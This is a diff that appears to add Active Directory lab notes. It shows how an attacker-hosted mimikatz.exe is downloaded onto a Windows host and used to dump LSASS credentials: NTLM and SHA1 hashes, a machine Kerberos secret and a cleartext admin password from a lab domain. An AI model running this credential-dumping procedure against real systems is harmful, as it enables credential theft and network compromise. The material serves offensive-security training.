@@ -1356,3 +1356,343 @@ Traceback (most recent call last):
 KeyError: 'Cryptodome.Cipher.AES'
 
 ```
+
+
+## Mimikatz Overview
+
+Tool used to view and steal credentials 
+
+```bash
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
+```
+
+![image.png](attachment:19422029-ec93-45d7-b0eb-8f8f24f3bab8:image.png)
+
+```bash
+Invoke-WebRequest -Uri http://192.168.126.135/mimikatz.exe -OutFile mimikatz.exe
+
+```
+
+```bash
+cUserspeterparkerDownloadsmimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 174408
+ .## ^ ##.  A La Vie, A L'Amour - (oe.eo)
+ ##   ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ##   ##        httpsblog.gentilkiwi.commimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'         httpspingcastle.com  httpsmysmartlogon.com 
+
+mimikatz # privilege
+ERROR mimikatz_doLocal ; (null) command of privilege module not found !
+
+Module         privilege
+Full name      Privilege module
+
+           debug  -  Ask debug privilege
+          driver  -  Ask load driver privilege
+        security  -  Ask security privilege
+             tcb  -  Ask tcb privilege
+          backup  -  Ask backup privilege
+         restore  -  Ask restore privilege
+          sysenv  -  Ask system environment privilege
+              id  -  Ask a privilege by its id
+            name  -  Ask a privilege by its name
+
+mimikatz # privilegedebug
+Privilege '20' OK
+
+mimikatz # sekurlsa
+ERROR mimikatz_doLocal ; (null) command of sekurlsa module not found !
+
+Module         sekurlsa
+Full name      SekurLSA module
+Description    Some commands to enumerate credentials...
+
+             msv  -  Lists LM & NTLM credentials
+         wdigest  -  Lists WDigest credentials
+        kerberos  -  Lists Kerberos credentials
+           tspkg  -  Lists TsPkg credentials
+         livessp  -  Lists LiveSSP credentials
+         cloudap  -  Lists CloudAp credentials
+             ssp  -  Lists SSP credentials
+  logonPasswords  -  Lists all available providers credentials
+         process  -  Switch (or reinit) to LSASS process  context
+        minidump  -  Switch (or reinit) to LSASS minidump context
+         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
+             pth  -  Pass-the-hash
+          krbtgt  -  krbtgt!
+     dpapisystem  -  DPAPI_SYSTEM secret
+           trust  -  Antisocial
+      backupkeys  -  Preferred Backup Master keys
+         tickets  -  List Kerberos tickets
+           ekeys  -  List Kerberos Encryption Keys
+           dpapi  -  List Cached MasterKeys
+         credman  -  List Credentials Manager
+
+mimikatz # sekurlsalogonPasswords
+
+Authentication Id  0 ; 377576 (000000000005c2e8)
+Session            Interactive from 1
+User Name          peterparker
+Domain             SPIDERMAN
+Logon Server       SPIDERMAN
+Logon Time         4192025 20030 PM
+SID                S-1-5-21-1226990740-2828406409-1400808678-1001
+        msv 
+         [00000003] Primary
+          Username  peterparker
+          Domain    SPIDERMAN
+          NTLM      64f12cddaa88057e06a81b54e73b949b
+          SHA1      cba4e545b7ec918129725154b29f055e4cd5aea8
+          DPAPI     cba4e545b7ec918129725154b29f055e
+        tspkg 
+        wdigest 
+          Username  peterparker
+          Domain    SPIDERMAN
+          Password  (null)
+        kerberos 
+          Username  peterparker
+          Domain    SPIDERMAN
+          Password  (null)
+        ssp 
+        credman 
+         [00000000]
+          Username  MARVELadministrator
+          Domain    HYDRA-DC
+          Password  P@$$w0rd!
+        cloudap 
+
+Authentication Id  0 ; 377391 (000000000005c22f)
+Session            Interactive from 1
+User Name          peterparker
+Domain             SPIDERMAN
+Logon Server       SPIDERMAN
+Logon Time         4192025 20030 PM
+SID                S-1-5-21-1226990740-2828406409-1400808678-1001
+        msv 
+         [00000003] Primary
+          Username  peterparker
+          Domain    SPIDERMAN
+          NTLM      64f12cddaa88057e06a81b54e73b949b
+          SHA1      cba4e545b7ec918129725154b29f055e4cd5aea8
+          DPAPI     cba4e545b7ec918129725154b29f055e
+        tspkg 
+        wdigest 
+          Username  peterparker
+          Domain    SPIDERMAN
+          Password  (null)
+        kerberos 
+          Username  peterparker
+          Domain    SPIDERMAN
+          Password  (null)
+        ssp 
+        credman 
+         [00000000]
+          Username  MARVELadministrator
+          Domain    HYDRA-DC
+          Password  P@$$w0rd!
+        cloudap 
+
+Authentication Id  0 ; 77828 (0000000000013004)
+Session            Interactive from 1
+User Name          DWM-1
+Domain             Window Manager
+Logon Server       (null)
+Logon Time         4192025 15909 PM
+SID                S-1-5-90-0-1
+        msv 
+         [00000003] Primary
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          NTLM      23e58192bce5f41ef46ebb67d5ae578d
+          SHA1      585144de343843308ca0b1d39282a5b529013530
+          DPAPI     585144de343843308ca0b1d39282a5b5
+        tspkg 
+        wdigest 
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          Password  (null)
+        kerberos 
+          Username  SPIDERMAN$
+          Domain    MARVEL.local
+          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
+        ssp 
+        credman 
+        cloudap 
+
+Authentication Id  0 ; 77811 (0000000000012ff3)
+Session            Interactive from 1
+User Name          DWM-1
+Domain             Window Manager
+Logon Server       (null)
+Logon Time         4192025 15909 PM
+SID                S-1-5-90-0-1
+        msv 
+         [00000003] Primary
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          NTLM      23e58192bce5f41ef46ebb67d5ae578d
+          SHA1      585144de343843308ca0b1d39282a5b529013530
+          DPAPI     585144de343843308ca0b1d39282a5b5
+        tspkg 
+        wdigest 
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          Password  (null)
+        kerberos 
+          Username  SPIDERMAN$
+          Domain    MARVEL.local
+          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
+        ssp 
+        credman 
+        cloudap 
+
+Authentication Id  0 ; 997 (00000000000003e5)
+Session            Service from 0
+User Name          LOCAL SERVICE
+Domain             NT AUTHORITY
+Logon Server       (null)
+Logon Time         4192025 15909 PM
+SID                S-1-5-19
+        msv 
+        tspkg 
+        wdigest 
+          Username  (null)
+          Domain    (null)
+          Password  (null)
+        kerberos 
+          Username  (null)
+          Domain    (null)
+          Password  (null)
+        ssp 
+        credman 
+        cloudap 
+
+Authentication Id  0 ; 996 (00000000000003e4)
+Session            Service from 0
+User Name          SPIDERMAN$
+Domain             MARVEL
+Logon Server       (null)
+Logon Time         4192025 15908 PM
+SID                S-1-5-20
+        msv 
+         [00000003] Primary
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          NTLM      23e58192bce5f41ef46ebb67d5ae578d
+          SHA1      585144de343843308ca0b1d39282a5b529013530
+          DPAPI     585144de343843308ca0b1d39282a5b5
+        tspkg 
+        wdigest 
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          Password  (null)
+        kerberos 
+          Username  spiderman$
+          Domain    MARVEL.local
+          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
+        ssp 
+        credman 
+        cloudap 
+
+Authentication Id  0 ; 52516 (000000000000cd24)
+Session            Interactive from 0
+User Name          UMFD-0
+Domain             Font Driver Host
+Logon Server       (null)
+Logon Time         4192025 15908 PM
+SID                S-1-5-96-0-0
+        msv 
+         [00000003] Primary
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          NTLM      23e58192bce5f41ef46ebb67d5ae578d
+          SHA1      585144de343843308ca0b1d39282a5b529013530
+          DPAPI     585144de343843308ca0b1d39282a5b5
+        tspkg 
+        wdigest 
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          Password  (null)
+        kerberos 
+          Username  SPIDERMAN$
+          Domain    MARVEL.local
+          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
+        ssp 
+        credman 
+        cloudap 
+
+Authentication Id  0 ; 52474 (000000000000ccfa)
+Session            Interactive from 1
+User Name          UMFD-1
+Domain             Font Driver Host
+Logon Server       (null)
+Logon Time         4192025 15908 PM
+SID                S-1-5-96-0-1
+        msv 
+         [00000003] Primary
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          NTLM      23e58192bce5f41ef46ebb67d5ae578d
+          SHA1      585144de343843308ca0b1d39282a5b529013530
+          DPAPI     585144de343843308ca0b1d39282a5b5
+        tspkg 
+        wdigest 
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          Password  (null)
+        kerberos 
+          Username  SPIDERMAN$
+          Domain    MARVEL.local
+          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
+        ssp 
+        credman 
+        cloudap 
+
+Authentication Id  0 ; 51131 (000000000000c7bb)
+Session            UndefinedLogonType from 0
+User Name          (null)
+Domain             (null)
+Logon Server       (null)
+Logon Time         4192025 15908 PM
+SID               
+        msv 
+         [00000003] Primary
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          NTLM      23e58192bce5f41ef46ebb67d5ae578d
+          SHA1      585144de343843308ca0b1d39282a5b529013530
+          DPAPI     585144de343843308ca0b1d39282a5b5
+        tspkg 
+        wdigest 
+        kerberos 
+        ssp 
+        credman 
+        cloudap 
+
+Authentication Id  0 ; 999 (00000000000003e7)
+Session            UndefinedLogonType from 0
+User Name          SPIDERMAN$
+Domain             MARVEL
+Logon Server       (null)
+Logon Time         4192025 15908 PM
+SID                S-1-5-18
+        msv 
+        tspkg 
+        wdigest 
+          Username  SPIDERMAN$
+          Domain    MARVEL
+          Password  (null)
+        kerberos 
+          Username  spiderman$
+          Domain    MARVEL.LOCAL
+          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
+        ssp 
+        credman 
+        cloudap 
+
+mimikatz #
+
+```
